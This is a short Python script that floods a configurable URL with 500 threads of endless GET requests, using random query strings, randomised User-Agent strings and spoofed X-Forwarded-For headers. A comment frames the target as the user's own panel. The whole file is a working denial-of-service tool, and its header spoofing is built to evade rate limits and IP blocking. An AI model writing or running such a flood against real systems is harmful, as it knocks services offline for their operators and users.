import threading, requests, random, string, time

url = "http://yourpanel.local"  # ⚠️ Replace with your panel's IP or domain
threads = 500

def flood(i):
    while True:
        try:
            r = requests.get(url + "?q=" + ''.join(random.choices(string.ascii_letters, k=5)), headers={
                "User-Agent": f"Mozilla/5.0 {random.randint(100,999)}",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }, timeout=2)
            print(f"[{i}] ✅ {r.status_code}")
        except:
            print(f"[{i}] ❌ Failed")
        time.sleep(0.01)

for i in range(threads):
    threading.Thread(target=flood, args=(i,)).start()
  
